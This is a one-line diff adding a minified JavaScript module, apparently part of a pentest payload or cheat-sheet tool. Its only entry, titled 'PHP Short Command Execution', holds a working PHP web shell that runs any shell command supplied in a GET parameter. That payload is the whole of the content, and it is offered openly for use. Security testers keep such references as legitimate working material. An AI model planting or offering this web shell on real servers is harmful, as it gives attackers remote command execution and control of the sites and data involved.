@@ -1,0 +1,1 @@
+const e=[{title:"PHP Short Command Execution",template:"<?=`$_GET[0]`?>",description:"Short PHP one-liner for command execution using GET parameter 0."}],t={commands:e};export{e as commands,t as default};
